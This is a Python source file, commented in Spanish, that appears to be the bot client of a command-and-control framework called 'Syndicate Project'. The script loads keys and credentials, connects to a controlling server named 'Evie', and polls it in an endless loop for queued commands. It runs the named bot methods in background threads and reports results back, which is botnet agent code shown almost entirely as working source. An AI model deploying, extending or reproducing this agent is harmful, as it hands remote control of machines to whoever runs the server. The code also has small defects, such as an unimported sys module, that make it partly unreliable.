#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import rook
import os
import re
import threading
from inspect import ismethod
from time import sleep

from utils.Checks import is_public_key

from modules.UI import argprogrammer

# Cargamos las dependencias de los complementos
from payload_conf import modules

from conf import global_conf

verbose = False

privateKey_client = None
pattern_key_save = 'result_of_'
publicKey_server = None
password = None
headers = None
bot_id = None
iterations = global_conf.hashing['iterations']
security_chars = global_conf.hashing['chars']
security_number = global_conf.hashing['security_number']
decrement_number = global_conf.hashing['decrement_number']

# Métodos que no están permitidos:

no_execute = [
                '__init__',
                'setServerCredentials',
                'setCredentials',
                'send',
                '_bot__sendData',
                'setDirector'
                
            ]

# Init UTILS

def printI(string):

    if (verbose == True):

        print(string)

    return(string)

def execute_init(instance, function, value):

    try:

        getattr(instance, function)(**value)

    except Exception as Except:

        instance.send((pattern_key_save + 'error_' + function, printI(str(Except))))

    else:

        printI('Operación: "{}" ejecutada con éxito...'.format(function))

# End UTILS

def loop(rook_instance, sleep_check):

    bucle_count = 0

    while (True):

        bucle_count += 1

        printI('Conectando...')

        cmd = rook_instance.getQueue()

        printI('Abriendo bucle evaluativo (%d) ...' % (bucle_count))

        for url, data in cmd.items():

            if not (data[1] == []) and not (data[0] == False):

                data = data[1]

                printI('Recibido, datos por parte de {}'.format(url))

                for _ in data:

                    if (len(_) != 2):

                        rook_instance.send((pattern_key_save + 'error', printI('ERROR: La longitud de los datos no es correcta')))
                        continue

                    (key, value) = _

                    if (isinstance(value, dict) == True):

                        if (hasattr(rook_instance, key) == True):

                            if not (key in no_execute):

                                try:

                                    if (ismethod(getattr(rook_instance, key))):

                                        printI('SUCCESS: Ejecutando: "{}"'.format(key))

                                        thread = threading.Thread(target=execute_init, args=(rook_instance, key, value if not (key == 'addserver') else {})) # Evitar que agrguen otros servidores secundarios
                                        thread.setDaemon(True)
                                        thread.start()

                                    else:

                                        printI('WARNING: {} no es una función'.format(key))

                                except Exception as Except:

                                    printI('ERROR: Ocurrio una excepción: {}'.format(Except))

                            else:

                                rook_instance.send((pattern_key_save + key, printI('WARNING: ¡No se puede ejecutar este método!')))

                        else:

                            rook_instance.send((pattern_key_save + key, printI('ERROR: El método "{}" no existe...'.format(key))))

                    else:

                        rook_instance.send((pattern_key_save + key, printI('ERROR: El tipo de dato de los parámetros no es correcto')))

            else:

                printI('WARNING: Aún no hay datos...')

        printI('Fin del bucle evaluativo.')

        sleep(sleep_check)

        printI('WARNING: Intervalo terminado.')

def set_keys(pubKey_server, privKey_client):

    global publicKey_server, privateKey_client

    (publicKey_server, privateKey_client) = (pubKey_server, privKey_client)

def set_credentials(passwd, bot, chars, securityNumber, decrementNumber, iters):

    global password, bot_id, security_chars, security_number, decrement_number, iterations

    (password, bot_id, security_chars, security_number, decrement_number, iterations) = (passwd, bot, chars, securityNumber, decrementNumber, iters)

def set_headers(head):

    global headers

    headers = head

def init(*args, **kwargs):

    if (privateKey_client == None) or (publicKey_server == None) or (password == None) or (bot_id == None):

        raise RuntimeError('¡Faltan valores por definir!')

    rook_obj = rook.bot(*args, **kwargs)
    
    try:
        
        rook_obj.setServerCredentials(publicKey_server)
    
    except Exception as Except:

        printI('Error importando la clave pública de Evie. Excepción: {}'.format(Except))
        
        return(False)
    
    try:
        
        rook_obj.setCredentials(password, bot_id, privateKey_client, security_chars, iterations, security_number, decrement_number)

    except Exception as Except:
            
        printI('Error importando la clave privada del rook. Excepción: {}'.format(Except))
        
        return(False)

    try:

        rook_obj.setHeaders(headers)
    
    except Exception as Except:

        printI('ERROR: {}'.format(Except))

        return(False)

    return(rook_obj)

if __name__ == '__main__':

    # Cambiamos el modo verbose en permitido en caso de que usemos "payload.py" como una aplicación

    verbose = True

    # Variables pre-determinadas

    default_sleep = 1
    default_sleep_check = 10
    default_path = '/'
    default_proto = 'http'

    # Grupos

    group_optionals = 'Configuración'
    group_security = 'Seguridad'

    parser = argprogrammer.Parser()

    # Head

    parser.set_head('''
       Syndicate Project - Carga útil para pruebas
       -----------------   -----------------------''')

    # Requeridos

    parser.add(['-b', '--bot-id'], 'bot_id', 'El identificador del rook', require=True)
    parser.add(['-pass', '--password'], 'password', 'La frase de contraseña del rook', require=True)
    parser.add(['-a', '--address'], 'address', 'La dirección del servidor', require=True)
    parser.add(['-p', '--port'], 'port', 'El puerto a conectar', type=int, require=True)
    parser.add(['-pub-key'], 'pub_key', 'La clave pública de Evie. Puede ser la misma clave cómo un string o la ruta en donde se encuentra', require=True)
    parser.add(['-priv-key'], 'priv_key', 'La clave privada del rook. Sigue la misma sintaxis que la clave de Evie', require=True)

    # Opcionales

    parser.add(['-h', '--help'], 'help', 'Mostrar ayuda y sale', group=group_optionals)

    parser.add(['-P', '--path'], 'path', 'La ruta del servidor. Pre-determinado: "{}"'.format(default_path), default=default_path)
    parser.add(['-proto'], 'proto', 'El esquema a utilizar. Sólo es posible usar: [HTTP, HTTPS]. Pre-determinado: "{}"'.format(default_proto), uniqval=['http', 'https'], default=default_proto, group=group_optionals)
    parser.add(['-headers'], 'headers', 'Los encabezados HTTP. Sintaxis: "key=value&key1=value=1"', type=dict, group=group_optionals)
    parser.add(['-db-pass'], 'db_pass', 'La contraseña para encriptar la base de datos', group=group_optionals)
    parser.add(['-db-path'], 'db_path', 'El nombre de la base de datos', group=group_optionals)
    parser.add(['-sleep'], 'sleep', 'El tiempo de espera para el envío de cada respuesta entre los diferentes servidores secundaros. Pre-determinado: "{}"'.format(default_sleep), type=int, default=default_sleep, group=group_optionals)
    parser.add(['-sleep-check'], 'sleep_check', 'El intervalo del bucle, para verificar comandos en cola. Pre-determinado: "{}"'.format(default_sleep_check), group=group_optionals, type=int, default=default_sleep_check)
    parser.add(['-no-verbose'], 'no_verbose', type=bool, action=True, group=group_optionals)

    # Seguridad

    parser.add(['-i', '--iterations'], 'iterations', 'Número de iteraciones', default=iterations, group=group_security)
    parser.add(['-sn', '--security-number'], 'security_number', 'Número de seguridad', default=security_number, group=group_security)
    parser.add(['-dn', '--decrement-number'], 'decrement_number', 'Número de disminución', default=decrement_number, group=group_security)
    parser.add(['-sc', '--security-chars'], 'security_chars', 'Caracteres de seguridad', default=security_chars, group=group_security)

    args = parser.parse_args()

    param_bot_id = args.bot_id
    param_password = args.password
    param_address = args.address
    param_port = args.port
    param_path = args.path
    param_pubKey = args.pub_key
    param_privKey = args.priv_key

    param_iterations = args.iterations
    param_security_number = args.security_number
    param_decrement_number = args.decrement_number
    param_security_chars = args.security_chars
    param_proto = args.proto
    param_headers = args.headers
    param_db_pass = args.db_pass
    param_db_path = args.db_path
    param_sleep = args.sleep
    param_sleep_check = args.sleep_check
    param_no_verbose = args.no_verbose
    
    params = {
            
                'address':param_address,
                'port':param_port,
                'path':param_path
                
            }

    if not (param_proto == None):

        params['proto'] = param_proto.lower()

    if not (param_db_pass == None):

        params['db_pass'] = param_db_pass

    if not (param_db_path == None):

        params['db_path'] = param_db_path

    if not (param_sleep == None):

        params['sleep'] = param_sleep

    if (param_no_verbose == True):

        verbose = False

    # Sí existen las claves, se abrira el archivo y se usaran en lugar de ser un string

    if (os.path.isfile(param_pubKey) == True):

        with open(param_pubKey, 'rb') as file_object:

            param_pubKey = file_object.read()

        if not (is_public_key.check(param_pubKey) == True):

            print('El archivo "{}" no es un buen candidato para una clave pública...')
            sys.exit(1)

    if (os.path.isfile(param_privKey) == True):

        with open(param_privKey, 'rb') as file_object:

            param_privKey = file_object.read()

        if not (is_public_key.check(param_privKey) == -1):

            print('El archivo "{}" no es un buen candidato para una clave privada...')
            sys.exit(1)

    set_keys(param_pubKey, param_privKey)
    set_credentials(param_password, param_bot_id, param_security_chars, param_security_number, param_decrement_number, param_iterations)
    set_headers(param_headers)
    rook_hook = init(**params)

    if (rook_hook == False):
        
        printI('Error en la operación de inicialización ...')
    
    else:

        printI('Iniciando bucle para esperar conexiones ...')

        try:
            
            loop(rook_hook, param_sleep_check)

        except KeyboardInterrupt:

            pass
        
        except Exception as Except:

            printI('Ocurrio un error: {}'.format(Except))

        finally:

            printI('Terminado.')
